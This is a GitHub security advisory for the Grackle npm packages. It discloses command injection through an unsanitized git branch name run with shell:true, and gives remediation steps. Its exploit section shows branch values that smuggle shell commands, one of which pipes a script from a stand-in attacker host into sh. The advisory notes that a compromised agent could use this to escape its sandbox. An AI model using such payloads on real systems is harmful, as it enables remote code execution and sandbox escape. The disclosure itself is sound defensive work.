# [H] Grackle has command/argument injection in the git worktree executor that enables RCE on provisioned hosts via an unsanitized task branch name (shell:true)

## Summary
Severity: High
Advisory: GHSA-vv65-f55v-xm6g
CWE: CWE-78, CWE-88
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-vv65-f55v-xm6g
Type: github-advisory

## Affected
- npm: `@grackle-ai/runtime-sdk` — affected >=0
- npm: `@grackle-ai/powerline` — affected >=0

## Details
## Summary

The default git executor used for all worktree operations spawns `git` through a shell, and the untrusted task **branch** name flows into the command unsanitized. A caller able to reach the PowerLine `SpawnSession` RPC (a malicious or compromised agent acting through the orchestration layer, or any client able to spawn a task) can achieve **arbitrary command execution** as the PowerLine user on every provisioned environment (SSH host, Docker container, or Codespace), escaping the agent sandbox.

This advisory bundles two related defects in `worktree.ts` (audit findings **F1** and **F13**).

## Affected versions

`@grackle-ai/runtime-sdk` (and reachable via `@grackle-ai/powerline`) at version **0.132.1** and earlier. All publishable packages are lockstep-versioned.

## F1 — Command injection via `shell:true` (primary, High)

**Location:** `packages/runtime-sdk/src/worktree.ts:22-28` (sink), `:135-143` (branch → args). Source: `packages/powerline/src/grpc-server.ts:112` (`req.branch`), `packages/runtime-sdk/src/base-session.ts:60,137`.

`NODE_GIT_EXECUTOR.exec` runs:

```ts
const shell = process.env.SHELL || true;   // worktree.ts:24 — always truthy
const result = await execRaw("git", args, { ...options, shell });
```

When `shell` is truthy, Node does **not** pass `args` as a safe argv vector — it concatenates `git` + args into a single string run through `sh -c` with **no escaping**. The untrusted `branch` flows unvalidated from the `SpawnSession` gRPC request into:

```ts
["worktree", "add", "-b", branch, wtPath, startPoint]   // worktree.ts:135-137
["worktree", "add", wtPath, branch]                     // fallback :143
```

`sanitizeBranch()` (`worktree.ts:50`) is applied **only** to compute the on-disk worktree directory path — *not* to the `-b <branch>` argument — so it provides zero protection at the injection sink.

**Exploit:** set a task branch to `x;curl http://attacker/x.sh|sh;#` or `$(touch /tmp/pwned)`. `ensureWorktree` runs it under `sh -c`, yielding RCE as the PowerLine user. (Empirically confirmed during the audit: an args-array branch value `evilbranch;touch /tmp/PWNED` created the file.)

The sibling git path in `runtime-utils.ts:48-56` already uses `execFileAsync("git", [...])` with **no** shell, confirming `shell:true` is unnecessary here.

## F13 — Argument injection: missing `--` separator (residual, Low)

**Location:** `packages/runtime-sdk/src/worktree.ts:135-143`.

Independent of the shell issue, `branch` is placed as a positional argument with no `--` terminator. The sibling `checkoutBranch` (`runtime-utils.ts:51`) correctly uses `["checkout", "--", branch]`. Only the fallback invocation (bare trailing positional) is genuinely flag-injectable; `git worktree add` exposes no dangerous flags reachable this way, so standalone impact is limited — but it should be hardened alongside F1.

## Remediation

1. **Remove `shell` from `NODE_GIT_EXECUTOR`** — `execFile('git', args)` with the argv array is already safe and is the pattern used in `runtime-utils.ts`. This is the primary fix.
2. Add a `--` separator before positional refs/paths in both `worktree add` invocations.
3. **Defense in depth:** validate `branch` at the gRPC boundary (`grpc-server.ts`) against git ref rules — reject names beginning with `-`, containing `..`, or containing shell metacharacters — before it reaches `ensureWorktree`.

## References
- https://github.com/nick-pape/grackle/security/advisories/GHSA-vv65-f55v-xm6g
- https://github.com/nick-pape/grackle
